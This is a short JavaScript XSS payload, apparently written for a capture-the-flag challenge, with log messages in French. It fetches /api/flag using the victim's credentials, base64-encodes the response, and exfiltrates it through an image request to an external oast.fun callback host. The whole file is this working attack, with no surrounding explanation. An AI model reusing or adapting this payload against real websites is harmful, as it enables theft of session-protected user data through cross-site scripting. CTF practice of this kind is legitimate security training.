(function () {
    console.log('[INFO] Début de l’exécution du script XSS');

    try {
        fetch('/api/flag', { credentials: 'include' })
            .then(function (response) {
                if (!response.ok) {
                    throw new Error('Réponse HTTP non valide : ' + response.status);
                }
                console.log('[INFO] Contenu de /api/flag récupéré avec succès');
                return response.text();
            })
            .then(function (pageContent) {
                console.log('[DEBUG] Données récupérées, encodage en base64...');
                const encoded = btoa(pageContent);

                const exfilUrl = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?data=' + encodeURIComponent(encoded);
                console.log('[INFO] Transmission au serveur distant via image :', exfilUrl);

                const img = new Image();
                img.src = exfilUrl;
            })
            .catch(function (error) {
                console.error('[ERROR] Échec de la requête ou de l’envoi des données :', error);
            });
    } catch (generalError) {
        console.error('[CRITIQUE] Erreur non gérée dans le bloc principal :', generalError);
    }
})();
